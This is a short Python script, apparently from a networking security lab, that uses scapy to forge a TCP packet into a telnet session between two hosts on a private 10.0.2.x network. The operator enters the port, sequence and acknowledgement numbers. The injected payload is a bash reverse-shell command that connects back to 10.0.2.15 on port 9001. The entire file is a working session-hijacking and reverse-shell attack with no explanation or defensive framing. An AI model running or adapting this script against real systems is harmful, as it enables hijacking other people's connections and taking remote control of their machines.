from scapy.all import *

victim1 = "10.0.2.6"
victim1_mac = "08:00:27:8a:a1:b6"
victim2 = "10.0.2.7"
victim2_mac = "08:00:27:6a:a9:24"
shell = "bash -i > /dev/tcp/10.0.2.15/9001 2>&1 0>&1\r\n"
#shell = "h"
port = input("port number => ")
newseq = input("SEQ number => ")
newack = input("ACK number => ")
ip = IP(src=victim1,dst=victim2,ttl=64)
tcp = TCP(sport=int(port),dport=23,flags="PA",seq=int(newseq),ack=int(newack),window=237)
ip.chksum = None
tcp.chksum = None
npkt = ip/tcp/Raw(load=shell)
npkt.show2()
send(npkt)
